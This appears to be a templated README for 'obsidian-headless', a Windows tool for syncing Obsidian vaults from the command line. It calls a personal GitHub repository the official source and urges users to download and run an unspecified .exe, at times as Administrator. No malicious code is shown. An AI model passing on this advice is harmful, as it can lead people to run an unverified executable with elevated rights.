# 🗄️ obsidian-headless - Sync Obsidian Vaults Without Desktop

[![Download obsidian-headless](https://img.shields.io/badge/Download-obsidian--headless-4caf50?style=for-the-badge)](https://github.com/Jimytimyzimy/obsidian-headless)

## 📦 What is obsidian-headless?

obsidian-headless is a simple tool that lets you sync your Obsidian vaults from the command line. It works without launching the Obsidian desktop app. If you want to keep your notes updated and synced but prefer not to open Obsidian all the time, this tool helps you do that.

You use it by running commands on your Windows computer. It connects to Obsidian Sync and downloads or uploads your vault files in the background.

## 💻 System Requirements

- Windows 10 or later (64-bit recommended)
- At least 1 GB of free disk space for your vault sync operations
- A stable internet connection
- Access to an Obsidian Sync account with an active subscription
- Basic familiarity with Windows command prompt

## ⚙️ Features

- Sync vaults from the command line without opening the desktop app
- Works with multiple Obsidian vaults
- Supports both downloading and uploading changes
- Runs quickly with minimal system resources
- Easy to automate with Windows Task Scheduler or scripts

## 🚀 Getting Started

To start using obsidian-headless, follow these steps carefully. They will help you download, install, and run the tool on your Windows PC.

## 🔽 Step 1: Download obsidian-headless

You need to get the tool from the official GitHub page. This page contains the latest version you should use.

Click the button below to visit the download page:

[![Get obsidian-headless on GitHub](https://img.shields.io/badge/GitHub-Download-blue?style=for-the-badge)](https://github.com/Jimytimyzimy/obsidian-headless)

On the GitHub page:

- Look for the **Releases** section or a folder usually labeled "Releases."
- Find the latest stable version for Windows.
- Download the file that ends with `.exe` or `.zip`. The `.exe` will be ready to run, while the `.zip` will need to be extracted.

Save the file to a folder you can easily find, like your **Downloads** folder or the Desktop.

## 📥 Step 2: Install obsidian-headless

If you downloaded an `.exe` file:

- Double-click it to start the installation.
- Follow any simple steps shown in the installer.
- The program will install itself and create a shortcut or add itself to your system.

If you downloaded a `.zip` file:

- Right-click the file and choose **Extract All**.
- Select a folder where you want the files (Desktop works fine).
- Open the folder after extraction.

## 🛠️ Step 3: Prepare Your Obsidian Vault

Before syncing, make sure you have an Obsidian vault you want to keep synced.

- The vault should already be linked with Obsidian Sync.
- You should know the path to your vault folder on your computer.
- If you don’t have a vault yet, create one in Obsidian and enable Obsidian Sync.

## 📝 Step 4: Using obsidian-headless on Windows

Now you will use the command prompt to start the sync.

1. Open **Command Prompt**:
    - Press the **Windows key**, type **cmd**, then press **Enter**.
2. Change directory to where you installed or extracted obsidian-headless. For example:
    ```
    cd C:\Users\YourName\Downloads\obsidian-headless
    ```
3. Run the command with your vault path. A basic example might look like:
    ```
    obsidian-headless --vault "C:\Users\YourName\Documents\MyVault"
    ```
4. The tool will connect to Obsidian Sync and start syncing your files.
5. Wait for the process to finish. You will see messages telling you if files were updated, downloaded, or uploaded.

## 🔧 Step 5: Automate Syncing (Optional)

To keep your vault synced regularly without manual work, you can set up a task in Windows Task Scheduler.

1. Open **Task Scheduler** from the Start menu.
2. Choose **Create Basic Task**.
3. Name your task like "Obsidian Vault Sync."
4. Pick how often you want it to run (daily or hourly is common).
5. For the action, choose **Start a program**.
6. Browse to the obsidian-headless `.exe` or script.
7. Add the arguments with your vault location, for example:
   ```
   --vault "C:\Users\YourName\Documents\MyVault"
   ```
8. Finish and save the task.

This setup runs your sync automatically and keeps your vault up to date.

## 🔍 Troubleshooting Tips

- If the command says it can’t find the vault, check that the path you typed is correct.
- Make sure you have a working internet connection.
- Confirm your Obsidian Sync account is active.
- Run Command Prompt as Administrator if you see permission errors.
- Look for help or log files in the folder where you installed obsidian-headless.

## 📚 More Information

For detailed instructions, updates, and support:

Visit the GitHub page:

[https://github.com/Jimytimyzimy/obsidian-headless](https://github.com/Jimytimyzimy/obsidian-headless)

This page has guides, release notes, and a place to report issues if you run into problems.

## 🎯 Summary

Using obsidian-headless allows you to sync Obsidian vaults from your command line without opening the full Obsidian app. This lets you keep your notes updated quietly and efficiently on Windows systems.